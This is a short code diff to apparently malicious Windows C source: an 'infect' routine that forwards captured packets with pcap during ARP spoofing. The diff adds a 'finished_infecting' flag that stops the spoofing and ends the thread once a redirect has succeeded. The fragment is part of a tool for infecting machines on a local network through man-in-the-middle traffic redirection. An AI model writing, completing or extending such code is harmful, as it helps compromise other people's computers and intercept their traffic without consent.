@@ -26,6 +26,7 @@
 //globals
 static HANDLE act_threads[ACTS_NUM];
 static send_params send_packets_params;
+extern BOOL finished_infecting;
 send_params infect_params;
 
 static DWORD WINAPI send_packets(LPVOID lparam)
@@ -194,7 +195,7 @@ DWORD WINAPI scan(LPVOID lparam)
 DWORD WINAPI infect(LPVOID lparam)
 {
 	pCommand command = (pCommand)lparam;
-	
+
 	PIP_ADAPTER_INFO pAdapterInfo = NULL;
 	ULONG outBufLen = 0;
 	ULONG netmask, host;
@@ -317,8 +318,16 @@ DWORD WINAPI infect(LPVOID lparam)
 
 		/* foward packet */
 		pcap_sendpacket(fp, pkt_data, packet_size);
+
+		/* redirect worked */
+		if (finished_infecting)
+		{
+			finished_infecting = 0;
+			stop_arp_spoofing();
+			CloseHandle(hThread);
+			break;
+		}
 	}
-	//deal with routing stuff (wait for DNS sessions)
 	
 	return 0;
 }
